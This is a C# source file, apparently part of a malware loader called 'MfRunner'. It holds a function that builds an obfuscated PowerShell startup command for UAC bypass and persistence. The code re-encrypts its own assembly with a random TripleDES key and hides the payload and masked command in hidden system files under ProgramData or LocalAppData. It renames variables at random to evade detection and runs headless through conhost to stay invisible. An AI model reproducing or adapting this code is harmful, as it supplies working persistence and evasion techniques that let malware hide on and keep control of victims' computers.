using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
#if (BYPASS_UAC || PERSISTANCE)
        public static string CreateStartupCommand(string powershellCommandLine, bool persistanceCommand)
        {
            string commandSection = powershellCommandLine.Split(new string[] { "-command " }, StringSplitOptions.None)[1];
            string psSection = powershellCommandLine.Replace(commandSection, "");
            string[] commandSectionLines = commandSection.Split(';');

            for (int i = 0; i < commandSectionLines.Length - 2; i++)
            {
                string variableNameBefore = commandSectionLines[i].Split(' ')[0];
                if (!variableNameBefore.Contains('.'))
                {
                    string variableNameAfter = "$" + GenerateRandomString();
                    commandSection = commandSection.Replace(variableNameBefore, variableNameAfter);
                }
            }

            commandSectionLines = commandSection.Split(';');

            if (commandSectionLines[0].Contains("ReadAllText"))
            {
                if ((!IsElevated) || commandSectionLines[0].Contains("PROGRAMDATA"))
                {
                    CrashExit();
                    return "";
                }
                else
                {
                    string curFilePath = commandSectionLines[0].Split('(').Last().Split(')')[0];
                    curFilePath = curFilePath.Split('\'')[1];
                    curFilePath = curFilePath.Substring(1, curFilePath.Length - 1);
                    string assemblyFileName = Guid.NewGuid().ToString();
                    string curAssemblyPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\" + curFilePath;
                    string newAssemblyPath = Environment.GetEnvironmentVariable("PROGRAMDATA") + "\\" + assemblyFileName;
                    File.Copy(Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\" + curFilePath, newAssemblyPath, true);
                    try { File.Delete(curAssemblyPath); } catch { }
                    commandSectionLines[0] = commandSectionLines[0].Replace("LOCALAPPDATA", "PROGRAMDATA").Replace(curFilePath, assemblyFileName);
                }
            }
            else
            {
                byte[] newEncryptionKey = new byte[16];
                RandomNumberGenerator.Create().GetBytes(newEncryptionKey);
                commandSectionLines[2] = commandSectionLines[2].Substring(0, commandSectionLines[2].IndexOf('(') + 1) + string.Join(",", newEncryptionKey) + ")";
                var mfRunnerAssembly = Assembly.GetExecutingAssembly();
                var getRawBytesMethod = mfRunnerAssembly.GetType().GetMethod("GetRawBytes", BindingFlags.Instance | BindingFlags.NonPublic);
                byte[] assemblyBytes = (byte[])getRawBytesMethod.Invoke(mfRunnerAssembly, null);
                var assemblyDigest = SHA256.Create().ComputeHash(assemblyBytes);
                commandSectionLines[13] = commandSectionLines[13].Substring(0, commandSectionLines[13].IndexOf('(') + 1) + string.Join(",", assemblyDigest) + ")";
                var compressedStream = new MemoryStream();
                var gzipStream = new GZipStream(compressedStream, CompressionMode.Compress);
                gzipStream.Write(assemblyBytes, 0, assemblyBytes.Length);
                gzipStream.Close();
                assemblyBytes = compressedStream.ToArray();
                assemblyBytes = new TripleDESCryptoServiceProvider() { Padding = PaddingMode.PKCS7, Mode = CipherMode.ECB, Key = newEncryptionKey }
                    .CreateEncryptor().TransformFinalBlock(assemblyBytes, 0, assemblyBytes.Length);
                string encryptedAssemblyBase64 = Convert.ToBase64String(assemblyBytes);
                string envVariable = IsElevated ? "PROGRAMDATA" : "LOCALAPPDATA";
                string assemblyFileName = Guid.NewGuid().ToString();
                string newAssemblyPath = Environment.GetEnvironmentVariable(envVariable) + "\\" + assemblyFileName;
                File.WriteAllText(newAssemblyPath, encryptedAssemblyBase64);
                File.SetAttributes(newAssemblyPath, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
                commandSectionLines[0] = commandSectionLines[0].Substring(0, commandSectionLines[0].IndexOf('(') + 1) + "[System.IO.File]::ReadAllText($env:" + envVariable + " + '\\" + assemblyFileName + "'))";
            }

            commandSection = string.Join(";", commandSectionLines);
            string var10 = commandSectionLines[14].Split('{')[1].Split(' ')[0];
            string var11 = commandSectionLines[15].Split('{')[1].Split('(')[1].Split('.')[0];
            string var12 = commandSectionLines[15].Split('{').Last().Split('.')[0];
            commandSection = commandSection.Replace(var10, "$" + GenerateRandomString());
            commandSection = commandSection.Replace(var11, "$" + GenerateRandomString());
            commandSection = commandSection.Replace(var12, "$" + GenerateRandomString());

            if (persistanceCommand)
            {
                commandSectionLines = commandSection.Split(';');
                int beginPos = commandSectionLines[15].IndexOf("(,[");
                string endSection = commandSectionLines[15].Substring(beginPos, commandSectionLines[15].Length - beginPos);
                int sectionLength = endSection.IndexOf('}') - 1;
                string fullSection = commandSectionLines[15].Substring(beginPos, sectionLength);
                commandSectionLines[15] = commandSectionLines[14].Split('{')[0] + "{" + commandSectionLines[15].Replace(fullSection, "(,[string[]]@())");
                commandSectionLines[14] = "";
                commandSection = string.Join(";", commandSectionLines);
            }
            
            string startupCommand = psSection + commandSection;
            startupCommand = startupCommand.Replace("  -ep", " -ep");

            if (persistanceCommand)
            {
                string randomString = GenerateRandomString();
                string variableName = "$" + GenerateRandomString();
                string maskedCommand = string.Join("", startupCommand.Select(c => c.ToString() + (RandomGenerator.Next(5) == 0 ? randomString : "")).ToArray());

                string envVariable = IsElevated ? "PROGRAMDATA" : "LOCALAPPDATA";
                string maskedCommandFileName = Guid.NewGuid().ToString();
                string maskedCommandPath = Environment.GetEnvironmentVariable(envVariable) + "\\" + maskedCommandFileName;
                File.WriteAllText(maskedCommandPath, maskedCommand);
                File.SetAttributes(maskedCommandPath, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);

                string shortenedCommand = variableName + " = [System.IO.File]::ReadAllText($env:" + envVariable + " + '\\"  + maskedCommandFileName + "').Replace('" + randomString + "', ''); cmd /c " + variableName;
                startupCommand = "conhost.exe --headless " + psSection + shortenedCommand;
            }
            else if (Process.GetProcessesByName("openconsole").Length > 0)
            {
                startupCommand = "conhost.exe --headless " + startupCommand;
            }
            

            return startupCommand;
        }
#endif
    }
}
